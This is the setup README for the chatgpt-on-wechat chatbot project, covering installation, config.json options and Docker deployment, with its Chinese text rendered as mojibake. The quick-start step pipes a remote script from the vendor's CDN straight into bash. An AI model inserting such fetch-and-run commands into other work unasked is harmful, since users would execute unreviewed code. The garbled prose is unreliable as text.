 &lt;p&gt;&lt;strong&gt;2024.10.31Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/1.7.3"&gt;1.7.3ÁâàÊú¨&lt;/a&gt; Á®ãÂ∫èÁ®≥ÂÆöÊÄßÊèêÂçá„ÄÅÊï∞ÊçÆÂ∫ìÂäüËÉΩ„ÄÅClaudeÊ®°Âûã‰ºòÂåñ„ÄÅlinkaiÊèí‰ª∂‰ºòÂåñ„ÄÅÁ¶ªÁ∫øÈÄöÁü•&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Êõ¥Â§öÊõ¥Êñ∞ÂéÜÂè≤ËØ∑Êü•Áúã: &lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/docs/release/history.md"&gt;Êõ¥Êñ∞Êó•Âøó&lt;/a&gt;&lt;/p&gt; 
&lt;br /&gt; 
&lt;h1&gt;üöÄ Âø´ÈÄüÂºÄÂßã&lt;/h1&gt; 
&lt;p&gt;È°πÁõÆÊèê‰æõ‰∫Ü‰∏ÄÈîÆÂÆâË£Ö„ÄÅÈÖçÁΩÆ„ÄÅÂêØÂä®„ÄÅÁÆ°ÁêÜÁ®ãÂ∫èÁöÑËÑöÊú¨ÔºåÊé®Ëçê‰ΩøÁî®ËÑöÊú¨Âø´ÈÄüËøêË°åÔºå‰πüÂèØ‰ª•Ê†πÊçÆ‰∏ãÊñá‰∏≠ÁöÑËØ¶ÁªÜÊåáÂºï‰∏ÄÊ≠•Ê≠•ÂÆâË£ÖËøêË°å„ÄÇ&lt;/p&gt; 
&lt;p&gt;Âú®ÁªàÁ´ØÊâßË°å‰ª•‰∏ãÂëΩ‰ª§Ôºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;bash &amp;lt;(curl -sS https://cdn.link-ai.tech/code/cow/run.sh)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ËÑöÊú¨‰ΩøÁî®ËØ¥ÊòéÔºö&lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/wiki/CowAgentQuickStart"&gt;‰∏ÄÈîÆËøêË°åËÑöÊú¨&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;‰∏Ä„ÄÅÂáÜÂ§á&lt;/h2&gt; 
&lt;h3&gt;1. Ê®°ÂûãAPI&lt;/h3&gt; 
&lt;p&gt;È°πÁõÆÊîØÊåÅÂõΩÂÜÖÂ§ñ‰∏ªÊµÅÂéÇÂïÜÁöÑÊ®°ÂûãÊé•Âè£ÔºåÂèØÈÄâÊ®°ÂûãÂèäÈÖçÁΩÆËØ¥ÊòéÂèÇËÄÉÔºö&lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/#%E6%A8%A1%E5%9E%8B%E8%AF%B4%E6%98%8E"&gt;Ê®°ÂûãËØ¥Êòé&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Ê≥®ÔºöAgentÊ®°Âºè‰∏ãÊé®Ëçê‰ΩøÁî®‰ª•‰∏ãÊ®°ÂûãÔºåÂèØÊ†πÊçÆÊïàÊûúÂèäÊàêÊú¨ÁªºÂêàÈÄâÊã©ÔºöMiniMAx(MiniMax-M2.1)„ÄÅGLM(glm-4.7)„ÄÅQwen(qwen3-max)„ÄÅClaude(claude-sonnet-4-5„ÄÅclaude-sonnet-4-0)„ÄÅGemini(gemini-3-flash-preview„ÄÅgemini-3-pro-preview)&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;ÂêåÊó∂ÊîØÊåÅ‰ΩøÁî® &lt;strong&gt;LinkAIÂπ≥Âè∞&lt;/strong&gt; Êé•Âè£ÔºåÂèØÁÅµÊ¥ªÂàáÊç¢ OpenAI„ÄÅClaude„ÄÅGemini„ÄÅDeepSeek„ÄÅQwen„ÄÅKimi Á≠âÂ§öÁßçÂ∏∏Áî®Ê®°ÂûãÔºåÂπ∂ÊîØÊåÅÁü•ËØÜÂ∫ì„ÄÅÂ∑•‰ΩúÊµÅ„ÄÅÊèí‰ª∂Á≠âAgentËÉΩÂäõÔºåÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/platform/api"&gt;Êé•Âè£ÊñáÊ°£&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;h3&gt;2.ÁéØÂ¢ÉÂÆâË£Ö&lt;/h3&gt; 
&lt;p&gt;ÊîØÊåÅ Linux„ÄÅMacOS„ÄÅWindows Êìç‰ΩúÁ≥ªÁªüÔºåÂèØÂú®‰∏™‰∫∫ËÆ°ÁÆóÊú∫ÂèäÊúçÂä°Âô®‰∏äËøêË°åÔºåÈúÄÂÆâË£Ö &lt;code&gt;Python&lt;/code&gt;ÔºåPythonÁâàÊú¨ÈúÄÂú®3.7 ~ 3.12 ‰πãÈó¥ÔºåÊé®Ëçê‰ΩøÁî®3.9ÁâàÊú¨„ÄÇ&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Ê≥®ÊÑèÔºöAgentÊ®°ÂºèÊé®Ëçê‰ΩøÁî®Ê∫êÁ†ÅËøêË°åÔºåËã•ÈÄâÊã©DockerÈÉ®ÁΩ≤ÂàôÊó†ÈúÄÂÆâË£ÖpythonÁéØÂ¢ÉÂíå‰∏ãËΩΩÊ∫êÁ†ÅÔºåÂèØÁõ¥Êé•Âø´ËøõÂà∞‰∏ã‰∏ÄËäÇ„ÄÇ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;(1) ÂÖãÈöÜÈ°πÁõÆ‰ª£Á†ÅÔºö&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;git clone https://github.com/zhayujie/chatgpt-on-wechat
cd chatgpt-on-wechat/
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Ëã•ÈÅáÂà∞ÁΩëÁªúÈóÆÈ¢òÂèØ‰ΩøÁî®ÂõΩÂÜÖ‰ªìÂ∫ìÂú∞ÂùÄÔºö&lt;a href="https://gitee.com/zhayujie/chatgpt-on-wechat"&gt;https://gitee.com/zhayujie/chatgpt-on-wechat&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;(2) ÂÆâË£ÖÊ†∏ÂøÉ‰æùËµñ (ÂøÖÈÄâ)Ôºö&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip3 install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;(3) ÊãìÂ±ï‰æùËµñ (ÂèØÈÄâÔºåÂª∫ËÆÆÂÆâË£Ö)Ôºö&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip3 install -r requirements-optional.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Â¶ÇÊûúÊüêÈ°π‰æùËµñÂÆâË£ÖÂ§±Ë¥•ÂèØÊ≥®ÈáäÊéâÂØπÂ∫îÁöÑË°åÂêéÈáçËØï„ÄÇ&lt;/p&gt; 
&lt;h2&gt;‰∫å„ÄÅÈÖçÁΩÆ&lt;/h2&gt; 
&lt;p&gt;ÈÖçÁΩÆÊñá‰ª∂ÁöÑÊ®°ÊùøÂú®Ê†πÁõÆÂΩïÁöÑ&lt;code&gt;config-template.json&lt;/code&gt;‰∏≠ÔºåÈúÄÂ§çÂà∂ËØ•Ê®°ÊùøÂàõÂª∫ÊúÄÁªàÁîüÊïàÁöÑ &lt;code&gt;config.json&lt;/code&gt; Êñá‰ª∂Ôºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;  cp config-template.json config.json
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ÁÑ∂ÂêéÂú®&lt;code&gt;config.json&lt;/code&gt;‰∏≠Â°´ÂÖ•ÈÖçÁΩÆÔºå‰ª•‰∏ãÊòØÂØπÈªòËÆ§ÈÖçÁΩÆÁöÑËØ¥ÊòéÔºåÂèØÊ†πÊçÆÈúÄË¶ÅËøõË°åËá™ÂÆö‰πâ‰øÆÊîπÔºàÊ≥®ÊÑèÂÆûÈôÖ‰ΩøÁî®Êó∂ËØ∑ÂéªÊéâÊ≥®ÈáäÔºå‰øùËØÅJSONÊ†ºÂºèÁöÑËßÑËåÉÔºâÔºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# config.json Êñá‰ª∂ÂÜÖÂÆπÁ§∫‰æã
{
  "channel_type": "web",                                      # Êé•ÂÖ•Ê∏†ÈÅìÁ±ªÂûãÔºåÈªòËÆ§‰∏∫webÔºåÊîØÊåÅ‰øÆÊîπ‰∏∫:feishu,dingtalk,wechatcom_app,terminal,wechatmp,wechatmp_service
  "model": "MiniMax-M2.1",                                    # Ê®°ÂûãÂêçÁß∞
  "minimax_api_key": "",                                      # MiniMax API Key
  "zhipu_ai_api_key": "",                                     # Êô∫Ë∞±GLM API Key
  "dashscope_api_key": "",                                    # ÁôæÁÇº(ÈÄö‰πâÂçÉÈóÆ)API Key
  "claude_api_key": "",                                       # Claude API Key
  "claude_api_base": "https://api.anthropic.com/v1",          # Claude API Âú∞ÂùÄÔºå‰øÆÊîπÂèØÊé•ÂÖ•‰∏âÊñπ‰ª£ÁêÜÂπ≥Âè∞
  "gemini_api_key": "",                                       # Gemini API Key
  "gemini_api_base": "https://generativelanguage.googleapis.com", # Gemini APIÂú∞ÂùÄ
  "open_ai_api_key": "",                                      # OpenAI API Key
  "open_ai_api_base": "https://api.openai.com/v1",            # OpenAI API Âú∞ÂùÄ
  "linkai_api_key": "",                                       # LinkAI API Key
  "proxy": "",                                                # ‰ª£ÁêÜÂÆ¢Êà∑Á´ØÁöÑipÂíåÁ´ØÂè£ÔºåÂõΩÂÜÖÁéØÂ¢ÉÈúÄË¶ÅÂºÄÂêØ‰ª£ÁêÜÁöÑÂèØÂ°´ÂÜôËØ•È°πÔºåÂ¶Ç "127.0.0.1:7890"
  "speech_recognition": false,                                # ÊòØÂê¶ÂºÄÂêØËØ≠Èü≥ËØÜÂà´
  "group_speech_recognition": false,                          # ÊòØÂê¶ÂºÄÂêØÁæ§ÁªÑËØ≠Èü≥ËØÜÂà´
  "voice_reply_voice": false,                                 # ÊòØÂê¶‰ΩøÁî®ËØ≠Èü≥ÂõûÂ§çËØ≠Èü≥
  "use_linkai": false,                                        # ÊòØÂê¶‰ΩøÁî®LinkAIÊé•Âè£ÔºåÈªòËÆ§ÂÖ≥Èó≠ÔºåËÆæÁΩÆ‰∏∫trueÂêéÂèØÂØπÊé•LinkAIÂπ≥Âè∞Êé•Âè£
  "agent": true,                                              # ÊòØÂê¶ÂêØÁî®AgentÊ®°ÂºèÔºåÂêØÁî®ÂêéÊã•ÊúâÂ§öËΩÆÂ∑•ÂÖ∑ÂÜ≥Á≠ñ„ÄÅÈïøÊúüËÆ∞ÂøÜ„ÄÅSkillsËÉΩÂäõÁ≠â
  "agent_workspace": "~/cow",                                 # AgentÁöÑÂ∑•‰ΩúÁ©∫Èó¥Ë∑ØÂæÑÔºåÁî®‰∫éÂ≠òÂÇ®memory„ÄÅskills„ÄÅÁ≥ªÁªüËÆæÂÆöÁ≠â
  "agent_max_context_tokens": 40000,                          # AgentÊ®°Âºè‰∏ãÊúÄÂ§ß‰∏ä‰∏ãÊñátokensÔºåË∂ÖÂá∫Â∞ÜËá™Âä®‰∏¢ÂºÉÊúÄÊó©ÁöÑ‰∏ä‰∏ãÊñá
  "agent_max_context_turns": 30,                              # AgentÊ®°Âºè‰∏ãÊúÄÂ§ß‰∏ä‰∏ãÊñáËÆ∞ÂøÜËΩÆÊ¨°ÔºåÊØèËΩÆÂåÖÊã¨‰∏ÄÊ¨°Áî®Êà∑ÊèêÈóÆÂíåAIÂõûÂ§ç
  "agent_max_steps": 15                                       # AgentÊ®°Âºè‰∏ãÂçïÊ¨°‰ªªÂä°ÁöÑÊúÄÂ§ßÂÜ≥Á≠ñÊ≠•Êï∞ÔºåË∂ÖÂá∫ÂêéÂ∞ÜÂÅúÊ≠¢ÁªßÁª≠Ë∞ÉÁî®Â∑•ÂÖ∑
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;ÈÖçÁΩÆË°•ÂÖÖËØ¥Êòé:&lt;/strong&gt;&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;1. ËØ≠Èü≥ÈÖçÁΩÆ&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt;Ê∑ªÂä† &lt;code&gt;"speech_recognition": true&lt;/code&gt; Â∞ÜÂºÄÂêØËØ≠Èü≥ËØÜÂà´ÔºåÈªòËÆ§‰ΩøÁî®openaiÁöÑwhisperÊ®°ÂûãËØÜÂà´‰∏∫ÊñáÂ≠óÔºåÂêåÊó∂‰ª•ÊñáÂ≠óÂõûÂ§çÔºåËØ•ÂèÇÊï∞‰ªÖÊîØÊåÅÁßÅËÅä (Ê≥®ÊÑèÁî±‰∫éËØ≠Èü≥Ê∂àÊÅØÊó†Ê≥ïÂåπÈÖçÂâçÁºÄÔºå‰∏ÄÊó¶ÂºÄÂêØÂ∞ÜÂØπÊâÄÊúâËØ≠Èü≥Ëá™Âä®ÂõûÂ§çÔºåÊîØÊåÅËØ≠Èü≥Ëß¶ÂèëÁîªÂõæ)Ôºõ&lt;/li&gt; 
  &lt;li&gt;Ê∑ªÂä† &lt;code&gt;"group_speech_recognition": true&lt;/code&gt; Â∞ÜÂºÄÂêØÁæ§ÁªÑËØ≠Èü≥ËØÜÂà´ÔºåÈªòËÆ§‰ΩøÁî®openaiÁöÑwhisperÊ®°ÂûãËØÜÂà´‰∏∫ÊñáÂ≠óÔºåÂêåÊó∂‰ª•ÊñáÂ≠óÂõûÂ§çÔºåÂèÇÊï∞‰ªÖÊîØÊåÅÁæ§ËÅä (‰ºöÂåπÈÖçgroup_chat_prefixÂíågroup_chat_keyword, ÊîØÊåÅËØ≠Èü≥Ëß¶ÂèëÁîªÂõæ)Ôºõ&lt;/li&gt; 
  &lt;li&gt;Ê∑ªÂä† &lt;code&gt;"voice_reply_voice": true&lt;/code&gt; Â∞ÜÂºÄÂêØËØ≠Èü≥ÂõûÂ§çËØ≠Èü≥ÔºàÂêåÊó∂‰ΩúÁî®‰∫éÁßÅËÅäÂíåÁæ§ËÅäÔºâ&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;2. ÂÖ∂‰ªñÈÖçÁΩÆ&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: Ê®°ÂûãÂêçÁß∞ÔºåAgentÊ®°Âºè‰∏ãÊé®Ëçê‰ΩøÁî® &lt;code&gt;MiniMax-M2.1&lt;/code&gt;„ÄÅ&lt;code&gt;glm-4.7&lt;/code&gt;„ÄÅ&lt;code&gt;qwen3-max&lt;/code&gt;„ÄÅ&lt;code&gt;claude-sonnet-4-5&lt;/code&gt;„ÄÅ&lt;code&gt;claude-sonnet-4-0&lt;/code&gt;„ÄÅ&lt;code&gt;gemini-3-flash-preview&lt;/code&gt;„ÄÅ&lt;code&gt;gemini-3-pro-preview&lt;/code&gt;ÔºåÂÖ®ÈÉ®Ê®°ÂûãÂêçÁß∞ÂèÇËÄÉ&lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/common/const.py"&gt;common/const.py&lt;/a&gt;Êñá‰ª∂&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;character_desc&lt;/code&gt;ÔºöÊôÆÈÄöÂØπËØùÊ®°Âºè‰∏ãÁöÑÊú∫Âô®‰∫∫Á≥ªÁªüÊèêÁ§∫ËØç„ÄÇÂú®AgentÊ®°Âºè‰∏ãËØ•ÈÖçÁΩÆ‰∏çÁîüÊïàÔºåÁî±Â∑•‰ΩúÁ©∫Èó¥‰∏≠ÁöÑÊñá‰ª∂ÂÜÖÂÆπÊûÑÊàê„ÄÇ&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;subscribe_msg&lt;/code&gt;ÔºöËÆ¢ÈòÖÊ∂àÊÅØÔºåÂÖ¨‰ºóÂè∑Âíå‰ºÅ‰∏öÂæÆ‰ø°channel‰∏≠ËØ∑Â°´ÂÜôÔºåÂΩìË¢´ËÆ¢ÈòÖÊó∂‰ºöËá™Âä®ÂõûÂ§çÔºå ÂèØ‰ΩøÁî®ÁâπÊÆäÂç†‰ΩçÁ¨¶„ÄÇÁõÆÂâçÊîØÊåÅÁöÑÂç†‰ΩçÁ¨¶Êúâ{trigger_prefix}ÔºåÂú®Á®ãÂ∫è‰∏≠ÂÆÉ‰ºöËá™Âä®ÊõøÊç¢ÊàêbotÁöÑËß¶ÂèëËØç„ÄÇ&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;5. LinkAIÈÖçÁΩÆ&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;use_linkai&lt;/code&gt;: ÊòØÂê¶‰ΩøÁî®LinkAIÊé•Âè£ÔºåÈªòËÆ§ÂÖ≥Èó≠ÔºåËÆæÁΩÆ‰∏∫trueÂêéÂèØÂØπÊé•LinkAIÂπ≥Âè∞Ôºå‰ΩøÁî®Áü•ËØÜÂ∫ì„ÄÅÂ∑•‰ΩúÊµÅ„ÄÅÊèí‰ª∂Á≠âËÉΩÂäõ, ÂèÇËÄÉ&lt;a href="https://docs.link-ai.tech/platform/api/chat"&gt;Êé•Âè£ÊñáÊ°£&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;linkai_api_key&lt;/code&gt;: LinkAI Api KeyÔºåÂèØÂú® &lt;a href="https://link-ai.tech/console/interface"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;linkai_app_code&lt;/code&gt;: LinkAI Â∫îÁî®ÊàñÂ∑•‰ΩúÊµÅÁöÑcodeÔºåÈÄâÂ°´ÔºåÊôÆÈÄöÂØπËØùÊ®°Âºè‰∏≠‰ΩøÁî®„ÄÇ&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;p&gt;Ê≥®ÔºöÂÖ®ÈÉ®ÈÖçÁΩÆÈ°πËØ¥ÊòéÂèØÂú® &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/config.py"&gt;&lt;code&gt;config.py&lt;/code&gt;&lt;/a&gt; Êñá‰ª∂‰∏≠Êü•Áúã„ÄÇ&lt;/p&gt; 
&lt;h2&gt;‰∏â„ÄÅËøêË°å&lt;/h2&gt; 
&lt;h3&gt;1.Êú¨Âú∞ËøêË°å&lt;/h3&gt; 
&lt;p&gt;Â¶ÇÊûúÊòØ‰∏™‰∫∫ËÆ°ÁÆóÊú∫ &lt;strong&gt;Êú¨Âú∞ËøêË°å&lt;/strong&gt;ÔºåÁõ¥Êé•Âú®È°πÁõÆÊ†πÁõÆÂΩï‰∏ãÊâßË°åÔºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python3 app.py         # windowsÁéØÂ¢É‰∏ãËØ•ÂëΩ‰ª§ÈÄöÂ∏∏‰∏∫ python app.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ËøêË°åÂêéÈªòËÆ§‰ºöÂêØÂä®webÊúçÂä°ÔºåÂèØÈÄöËøáËÆøÈóÆ &lt;code&gt;http://localhost:9899/chat&lt;/code&gt; Âú®ÁΩëÈ°µÁ´ØÂØπËØù„ÄÇ&lt;/p&gt; 
&lt;p&gt;Â¶ÇÊûúÈúÄË¶ÅÊé•ÂÖ•ÂÖ∂‰ªñÂ∫îÁî®ÈÄöÈÅìÂè™ÈúÄ‰øÆÊîπ &lt;code&gt;config.json&lt;/code&gt; ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑ &lt;code&gt;channel_type&lt;/code&gt; ÂèÇÊï∞ÔºåËØ¶ÊÉÖÂèÇËÄÉÔºö&lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/#%E9%80%9A%E9%81%93%E8%AF%B4%E6%98%8E"&gt;ÈÄöÈÅìËØ¥Êòé&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;h3&gt;2.ÊúçÂä°Âô®ÈÉ®ÁΩ≤&lt;/h3&gt; 
&lt;p&gt;Âú®ÊúçÂä°Âô®‰∏≠ÂèØ‰ΩøÁî® &lt;code&gt;nohup&lt;/code&gt; ÂëΩ‰ª§Âú®ÂêéÂè∞ËøêË°åÁ®ãÂ∫èÔºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;nohup python3 app.py &amp;amp; tail -f nohup.out
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ÊâßË°åÂêéÁ®ãÂ∫èËøêË°å‰∫éÊúçÂä°Âô®ÂêéÂè∞ÔºåÂèØÈÄöËøá &lt;code&gt;ctrl+c&lt;/code&gt; ÂÖ≥Èó≠Êó•ÂøóÔºå‰∏ç‰ºöÂΩ±ÂìçÂêéÂè∞Á®ãÂ∫èÁöÑËøêË°å„ÄÇ‰ΩøÁî® &lt;code&gt;ps -ef | grep app.py | grep -v grep&lt;/code&gt; ÂëΩ‰ª§ÂèØÊü•ÁúãËøêË°å‰∫éÂêéÂè∞ÁöÑËøõÁ®ãÔºåÂ¶ÇÊûúÊÉ≥Ë¶ÅÈáçÊñ∞ÂêØÂä®Á®ãÂ∫èÂèØ‰ª•ÂÖà &lt;code&gt;kill&lt;/code&gt; ÊéâÂØπÂ∫îÁöÑËøõÁ®ã„ÄÇ Êó•ÂøóÂÖ≥Èó≠ÂêéÂ¶ÇÊûúÊÉ≥Ë¶ÅÂÜçÊ¨°ÊâìÂºÄÂè™ÈúÄËæìÂÖ• &lt;code&gt;tail -f nohup.out&lt;/code&gt;„ÄÇ&lt;/p&gt; 
&lt;p&gt;Ê≠§Â§ñÔºåÈ°πÁõÆÁöÑ &lt;code&gt;scripts&lt;/code&gt; ÁõÆÂΩï‰∏ãÊúâ‰∏ÄÈîÆËøêË°å„ÄÅÂÖ≥Èó≠Á®ãÂ∫èÁöÑËÑöÊú¨‰æõ‰ΩøÁî®„ÄÇ ËøêË°åÂêéÈªòËÆ§channel‰∏∫webÔºåÈÄöËøáÂèØ‰ª•ÈÄöËøá‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂ËøõË°åÂàáÊç¢„ÄÇ&lt;/p&gt; 
&lt;h3&gt;3.DockerÈÉ®ÁΩ≤&lt;/h3&gt; 
&lt;p&gt;‰ΩøÁî®dockerÈÉ®ÁΩ≤Êó†ÈúÄ‰∏ãËΩΩÊ∫êÁ†ÅÂíåÂÆâË£Ö‰æùËµñÔºåÂè™ÈúÄË¶ÅËé∑Âèñ &lt;code&gt;docker-compose.yml&lt;/code&gt; ÈÖçÁΩÆÊñá‰ª∂Âπ∂ÂêØÂä®ÂÆπÂô®Âç≥ÂèØ„ÄÇAgentÊ®°Âºè‰∏ãÊõ¥Êé®Ëçê‰ΩøÁî®Ê∫êÁ†ÅËøõË°åÈÉ®ÁΩ≤Ôºå‰ª•Ëé∑ÂæóÊõ¥Â§öÁ≥ªÁªüËÆøÈóÆËÉΩÂäõ„ÄÇ&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;ÂâçÊèêÊòØÈúÄË¶ÅÂÆâË£ÖÂ•Ω &lt;code&gt;docker&lt;/code&gt; Âèä &lt;code&gt;docker-compose&lt;/code&gt;ÔºåÂÆâË£ÖÊàêÂäüÂêéÊâßË°å &lt;code&gt;docker -v&lt;/code&gt; Âíå &lt;code&gt;docker-compose version&lt;/code&gt; (Êàñ &lt;code&gt;docker compose version&lt;/code&gt;) ÂèØÊü•ÁúãÂà∞ÁâàÊú¨Âè∑„ÄÇÂÆâË£ÖÂú∞ÂùÄ‰∏∫ &lt;a href="https://docs.docker.com/engine/install/"&gt;dockerÂÆòÁΩë&lt;/a&gt; „ÄÇ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;(1) ‰∏ãËΩΩ docker-compose.yml Êñá‰ª∂&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;wget https://cdn.link-ai.tech/code/cow/docker-compose.yml
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;‰∏ãËΩΩÂÆåÊàêÂêéÊâìÂºÄ &lt;code&gt;docker-compose.yml&lt;/code&gt; Â°´ÂÜôÊâÄÈúÄÈÖçÁΩÆÔºå‰æãÂ¶Ç &lt;code&gt;CHANNEL_TYPE&lt;/code&gt;„ÄÅ&lt;code&gt;OPEN_AI_API_KEY&lt;/code&gt; ÂíåÁ≠âÈÖçÁΩÆ„ÄÇ&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;(2) ÂêØÂä®ÂÆπÂô®&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Âú® &lt;code&gt;docker-compose.yml&lt;/code&gt; ÊâÄÂú®ÁõÆÂΩï‰∏ãÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ÂêØÂä®ÂÆπÂô®Ôºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;sudo docker compose up -d         # Ëã•docker-compose‰∏∫ 1.X ÁâàÊú¨ÔºåÂàôÊâßË°å `sudo  docker-compose up -d`
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ËøêË°åÂëΩ‰ª§ÂêéÔºå‰ºöËá™Âä®Âèñ &lt;a href="https://hub.docker.com/r/zhayujie/chatgpt-on-wechat"&gt;docker hub&lt;/a&gt; ÊãâÂèñÊúÄÊñ∞releaseÁâàÊú¨ÁöÑÈïúÂÉè„ÄÇÂΩìÊâßË°å &lt;code&gt;sudo docker ps&lt;/code&gt; ËÉΩÊü•ÁúãÂà∞ NAMES ‰∏∫ chatgpt-on-wechat ÁöÑÂÆπÂô®Âç≥Ë°®Á§∫ËøêË°åÊàêÂäü„ÄÇÊúÄÂêéÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ÂèØÊü•ÁúãÂÆπÂô®ÁöÑËøêË°åÊó•ÂøóÔºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;sudo docker logs -f chatgpt-on-wechat
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;(3) Êèí‰ª∂‰ΩøÁî®&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Â¶ÇÊûúÈúÄË¶ÅÂú®dockerÂÆπÂô®‰∏≠‰øÆÊîπÊèí‰ª∂ÈÖçÁΩÆÔºåÂèØÈÄöËøáÊåÇËΩΩÁöÑÊñπÂºèÂÆåÊàêÔºåÂ∞Ü &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/plugins/config.json.template"&gt;Êèí‰ª∂ÈÖçÁΩÆÊñá‰ª∂&lt;/a&gt; ÈáçÂëΩÂêç‰∏∫ &lt;code&gt;config.json&lt;/code&gt;ÔºåÊîæÁΩÆ‰∫é &lt;code&gt;docker-compose.yml&lt;/code&gt; Áõ∏ÂêåÁõÆÂΩï‰∏ãÔºåÂπ∂Âú® &lt;code&gt;docker-compose.yml&lt;/code&gt; ‰∏≠ÁöÑ &lt;code&gt;chatgpt-on-wechat&lt;/code&gt; ÈÉ®ÂàÜ‰∏ãÊ∑ªÂä† &lt;code&gt;volumes&lt;/code&gt; Êò†Â∞Ñ:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;volumes:
  - ./config.json:/app/plugins/config.json
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Ê≥®&lt;/strong&gt;Ôºö‰ΩøÁî®dockerÊñπÂºèÈÉ®ÁΩ≤ÁöÑËØ¶ÁªÜÊïôÁ®ãÂèØ‰ª•ÂèÇËÄÉÔºö&lt;a href="https://www.wangpc.cc/ai/docker-deploy-cow/"&gt;dockerÈÉ®ÁΩ≤CoWÈ°πÁõÆ&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Ê®°ÂûãËØ¥Êòé&lt;/h2&gt; 
&lt;p&gt;‰ª•‰∏ãÂØπÊâÄÊúâÂèØÊîØÊåÅÁöÑÊ®°ÂûãÁöÑÈÖçÁΩÆÂíå‰ΩøÁî®ÊñπÊ≥ïËøõË°åËØ¥ÊòéÔºåÊ®°ÂûãÊé•Âè£ÂÆûÁé∞Âú®È°πÁõÆÁöÑ &lt;code&gt;models/&lt;/code&gt; ÁõÆÂΩï‰∏ã„ÄÇ&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;OpenAI&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://platform.openai.com/api-keys"&gt;OpenAIÂπ≥Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "gpt-4.1-mini",
    "open_ai_api_key": "YOUR_API_KEY",
    "open_ai_api_base": "https://api.openai.com/v1",
    "bot_type": "chatGPT"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
